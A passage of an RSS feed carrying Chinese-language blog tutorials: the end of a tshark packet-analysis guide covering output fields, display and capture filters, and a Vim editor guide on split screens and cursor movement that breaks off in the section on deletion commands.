&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r file.pcap -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;frame.number&amp;#34;&lt;/span&gt; -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;ip.addr&amp;#34;&lt;/span&gt; -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tcp.port&amp;#34;&lt;/span&gt; -e tcp -T fields
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//输出报文帧数、ip地址、端口、tcp协议的字段
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;                  192.168.1.12,192.168.1.8                    37546,80                Transmission Control Protocol,SrcPort: ... 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;报文帧数                        ip地址                                        端口                                   tcp协议的字段
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-y--筛选过滤报文&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-Y&lt;/span&gt; &amp;ndash; 筛选过滤报文
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;格式：-Y &amp;ldquo;过滤条件&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用来过滤分析符合过滤表达式的报文，相当于wireshark最上面的过滤筛选栏功能&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r &amp;lt;filename&amp;gt; -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;http.host == &amp;#34;&lt;/span&gt;web-server1&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;  //通过http.host过滤
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r http-keep-alive.pcap -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tcp.flags.syn==1&amp;amp;&amp;amp;tcp.flags.ack==0&amp;#34;&lt;/span&gt;  //过滤第一次握手的请求
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-e--设置输出的控制字段&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-E&lt;/span&gt; &amp;ndash; 设置输出的控制字段
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;通过&lt;code&gt;-T&lt;/code&gt;参数来输出特定格式时，可以配合&lt;code&gt;-E&lt;/code&gt;参数来设置一些选项&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;参数选项&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;默认&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;bom=y|n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;在输出前加上UTF-8字节顺序标记（十六进制ef、bb、bf）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;header=y|n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;打印一个使用-e作为输出第一行的字段名称头部&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;separator=/t|/s|&amp;lt;character&amp;gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/t&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;设置字段分隔符，默认为/t，可以指定/s，即单个空格，或者自定义的其它字符&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;occurrence=f|l|a&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;a&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;打印每个字段的第一次(f)/最后一次(l)/或所有出现的内容(a)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;aggregator=,|/s|&amp;lt;character&amp;gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;,&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;设置用于每个字段内的分割字符&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;quote=d|s|n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;设置用于环绕字段的引号字符&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;n是null，无设置&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r file.pcap  -E &lt;span style=&#34;color:#e06c75&#34;&gt;header&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;y -E &lt;span style=&#34;color:#e06c75&#34;&gt;occurrence&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;l -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;icmp.seq==21&amp;#39;&lt;/span&gt; -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;icmp.seq&amp;#39;&lt;/span&gt; ...  -T fields |column -t
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//    -E &lt;span style=&#34;color:#e06c75&#34;&gt;occurrence&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;l：包通过IPIP封装，occurrence&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;l指定输出外层IP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//    -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;icmp.seq==21&amp;#39;&lt;/span&gt;：指定icmp.seq等于21的ICMP包
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//    | column -t：将输出通过管道传输给 column 命令，使结果以表格的形式对齐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;icmp.seq                          ip.src                            ip.dst                                ip     
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;21&lt;/span&gt;                                    114.132.116.32            113.145.123.23                 Internet Protocol Version 4，Src:，Dst:
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-2--二次依赖分析&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-2&lt;/span&gt; &amp;ndash; 二次依赖分析
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;没有2以外的参数&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;tshark会根据上下文报文的依赖关系（tshark称之为&lt;strong&gt;two-pass&lt;/strong&gt;，即进行两次分析），来显示相关报文关联信息，如：&lt;code&gt;response in frame #&lt;/code&gt;、&lt;code&gt;reply in frame&lt;/code&gt;、&lt;code&gt;TCP Port numbers reused&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;-i--指定要捕获数据的网络接口&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-i&lt;/span&gt; &amp;ndash; 指定要捕获数据的网络接口
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-i eth0&lt;/code&gt;：**表示从 &lt;code&gt;eth0&lt;/code&gt; 网络接口捕获数据包&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-i wlan0&lt;/code&gt;：**表示从无线网卡 &lt;code&gt;wlan0&lt;/code&gt; 捕获数据包&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-i any&lt;/code&gt;：**表示捕获所有接口的流量&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-&lt;/code&gt;：**表示从标准输入（stdin）捕获数据流&lt;/p&gt;
&lt;h2 id=&#34;-f--应用捕获过滤器只捕获特定的流量&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-f&lt;/span&gt; &amp;ndash; 应用捕获过滤器，只捕获特定的流量
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-f &amp;quot;tcp&amp;quot;&lt;/code&gt;：**只捕获 TCP 流量&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-f &amp;quot;port 80&amp;quot;&lt;/code&gt;：**只捕获端口为 80（HTTP）的流量&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-f &amp;quot;src host 192.168.1.1&amp;quot;&lt;/code&gt;：**只捕获源地址为 &lt;code&gt;192.168.1.1&lt;/code&gt; 的流量&lt;/p&gt;
&lt;h2 id=&#34;-w--将捕获的数据包写入到文件中&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-w&lt;/span&gt; &amp;ndash; 将捕获的数据包写入到文件中
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-w output.pcap&lt;/code&gt;：**将捕获的数据包保存到 &lt;code&gt;output.pcap&lt;/code&gt; 文件&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-&lt;/code&gt;：**将捕获的内容输出到标准输出（stdout）&lt;/p&gt;
&lt;h2 id=&#34;options--其他可选参数&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;options&lt;/span&gt; &amp;ndash; 其他可选参数
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-V&lt;/code&gt;：**显示详细的包信息&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-c &amp;lt;count&amp;gt;&lt;/code&gt;：**捕获指定数量的包后停止&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-n&lt;/code&gt;：**禁止域名解析，使用 IP 地址而不是主机名显示&lt;/p&gt;
&lt;h2 id=&#34;filter指定显示过滤器&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;&amp;lt;filter&amp;gt; &lt;/span&gt;指定显示过滤器
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;如果要用过滤器，一定要放到最后&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;ip.addr == 192.168.1.1&lt;/code&gt;：**仅显示源或目标地址为 &lt;code&gt;192.168.1.1&lt;/code&gt; 的包。&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;tcp.port == 443&lt;/code&gt;：**仅显示端口为 443 的 TCP 数据包（通常用于 HTTPS 流量）。&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;http&lt;/code&gt;：**仅显示 HTTP 协议的数据包&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Vim编辑器完全使用教程</title>
        <link>https://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</link>
        <pubDate>Thu, 08 May 2025 15:28:02 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;vim使用方式&#34;&gt;VIM使用方式
&lt;/h1&gt;&lt;h2 id=&#34;vim键盘图&#34;&gt;vim键盘图
&lt;/h2&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/vi-vim-cheat-sheet-sch.gif&#34; alt=&#34;img&#34; style=&#34;zoom: 80%;&#34; /&gt;
&lt;h2 id=&#34;vim操作文件基本方式&#34;&gt;vim操作文件基本方式
&lt;/h2&gt;&lt;h3 id=&#34;打开文件&#34;&gt;打开文件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;单个文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim file1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;多个文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim file1 file2 ... filen
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该方式打开文件，显示屏默认显示第一个文件也就是 file1&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;文件之间的切换&#34;&gt;文件之间的切换
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:ls&lt;/strong&gt; &amp;ndash; 列出 VIM 打开的所有文件&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309200724231.png&#34; alt=&#34;image-20250309200724231&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:bn&lt;/strong&gt; &amp;ndash; 显示屏上显示第n个文件&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309200823642.png&#34; alt=&#34;image-20250309200823642&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;h3 id=&#34;显示多个文件&#34;&gt;显示多个文件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;左右分屏&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim -On file1 file2 ... filen
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的 n 是代表有几个文件需要分屏，从左至右依次显示 n 个文件&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309201414346.png&#34; alt=&#34;image-20250309201414346&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;上下分屏&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim -on file1 file2 ... filen
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跟上一个命令不同的是 -on 中的 &lt;strong&gt;o 是小写&lt;/strong&gt;，这样将会上下依次显示 n 个文件&lt;/p&gt;
&lt;img src=&#34;C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250309201606096.png&#34; alt=&#34;image-20250309201606096&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;分屏操作ctrlw系列&#34;&gt;分屏操作（ctrl+w系列）
&lt;/h3&gt;&lt;h4 id=&#34;左右分屏&#34;&gt;左右分屏
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+s&lt;/strong&gt;  &amp;ndash; 上下分割当前打开的文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:sp file&lt;/strong&gt; &amp;ndash; 上下分割当前文件和新打开的 file&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;上下分屏&#34;&gt;上下分屏
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+v&lt;/strong&gt;  &amp;ndash; 左右分割当前打开的文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:vsp file&lt;/strong&gt; &amp;ndash; 左右分割当前文件和新打开的 file&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;移动分屏&#34;&gt;移动分屏
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;大写字母&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+H&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到左边&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+L&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到右边&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+J&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到上边&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+K&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到下边&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;在文件间切换光标&#34;&gt;在文件间切换光标
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;小写字母&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+h&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+l&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+j&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+k&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;关闭分屏&#34;&gt;关闭分屏
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+c&lt;/strong&gt;  &amp;ndash; 关闭当前的分屏(多个分屏就只关闭光标所在的分屏)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+q&lt;/strong&gt;  &amp;ndash; 关闭当前的分屏，如果是最后一个分屏将会退出 VIM&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;vim五大模式&#34;&gt;vim五大模式
&lt;/h2&gt;&lt;h3 id=&#34;普通模式&#34;&gt;普通模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用户刚刚启动 vi/vim，便进入了普通模式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;此状态下敲击键盘动作会被 Vim 识别为命令，而非输入字符&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;普通模式移动光标&#34;&gt;普通模式移动光标
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;快速移动光标&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;输入[数字n＋方向]，代表向某个方向移动n&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;h / ← / [backspace]&lt;/strong&gt;：向左移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;j / ↓&lt;/strong&gt;：向下移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;k / ↑&lt;/strong&gt;：向上移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;l / → / [space]&lt;/strong&gt;：向右移动光标&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;在当前行上移动光标&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;0 或功能键[Home]&lt;/strong&gt; &amp;ndash; 移动到行头&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;^&lt;/strong&gt; &amp;ndash; 移动到本行的第一个不是 blank 字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$ 或功能键[End]&lt;/strong&gt; &amp;ndash; 移动到行尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;g_&lt;/strong&gt; &amp;ndash; 移动到本行最后一个不是 blank 字符的位置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;w&lt;/strong&gt; &amp;ndash; 光标移动到下一个单词的开头&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;e&lt;/strong&gt; &amp;ndash; 光标移动到下一个单词的结尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fa&lt;/strong&gt; &amp;ndash; 移动到本行下一个为 a 的字符处&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nfa&lt;/strong&gt; &amp;ndash; 移动到本行光标处开始的第 n 个 字符为 a 的地方&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fa&lt;/strong&gt; &amp;ndash; 同fa一样，光标移动方向同fa相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nFa&lt;/strong&gt; &amp;ndash; 同 nfa 类似，光标移动方向同 nfa相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ta&lt;/strong&gt; &amp;ndash; 移动光标至 a 字符的前一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nta&lt;/strong&gt; &amp;ndash; 移动到第n个 a 字符的前一个字符处&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ta&lt;/strong&gt; &amp;ndash; 同ta移动光标方向相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nTa&lt;/strong&gt; &amp;ndash; 同 nta 移动光标方向相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;; &amp;amp; ,&lt;/strong&gt; &amp;ndash; 当使用 f, F, t ,T, 关键字指定字符跳转的时候，使用**；&lt;strong&gt;可以快速跳转到&lt;/strong&gt;下一个&lt;strong&gt;指定的字符，&lt;/strong&gt;,** 是跳到&lt;strong&gt;前一个&lt;/strong&gt;指定的字符&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;跨行移动光标&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;nG&lt;/strong&gt; &amp;ndash; 光标定位到第 n 行的行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;gg&lt;/strong&gt; &amp;ndash; 光标定位到第一行的行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;G&lt;/strong&gt; &amp;ndash; 光标定位到最后一行的行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;H&lt;/strong&gt; &amp;ndash; 光标定位到&lt;strong&gt;当前屏幕&lt;/strong&gt;的第一行行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;M&lt;/strong&gt; &amp;ndash; 光标移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的中间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;L&lt;/strong&gt; &amp;ndash; 光标移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的尾部&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;zt&lt;/strong&gt; &amp;ndash; 把当前行移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的最上方，也就是第一行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;zz&lt;/strong&gt; &amp;ndash; 把当前行移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的中间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;zb&lt;/strong&gt; &amp;ndash; 把当前行移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的尾部&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%&lt;/strong&gt; &amp;ndash; 匹配括号移动，包括 ( , { , [ 需要把光标先移动到括号上&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;* &amp;amp; #&lt;/strong&gt; &amp;ndash; 匹配光标当前所在的单词， ***** 是下一个，&lt;strong&gt;#&lt;/strong&gt; 是上一个&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;翻页操作&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ctrl+u&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;上&lt;/strong&gt;滚动&lt;strong&gt;半&lt;/strong&gt;页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+b&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;上&lt;/strong&gt;滚动&lt;strong&gt;一&lt;/strong&gt;页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+d&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;下&lt;/strong&gt;滚动&lt;strong&gt;半&lt;/strong&gt;页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+f&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;下&lt;/strong&gt;滚动&lt;strong&gt;一&lt;/strong&gt;页&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;普通模式操作文本&#34;&gt;普通模式操作文本
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;删除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;d 是删除的意思，通常搭配一个字符 ( 删除范围 ) 实现删除功能，常用的如下：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dw&lt;/strong&gt; &amp;ndash; 删除一个单词&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dnw&lt;/strong&gt; &amp;ndash; 删除 n 个单词，&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dfa&lt;/strong&gt; &amp;ndash; 删除光标处到下一个 a 的字符处（ fa 定位光标到 a 处 ）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dnfa&lt;/strong&gt; &amp;ndash; 删除光标处到第 n 个 a 的字符处&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dd&lt;/strong&gt; &amp;ndash; 删除一整行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ndd&lt;/strong&gt; &amp;ndash; 删除光标处开始的 n 行&lt;/li&gt;
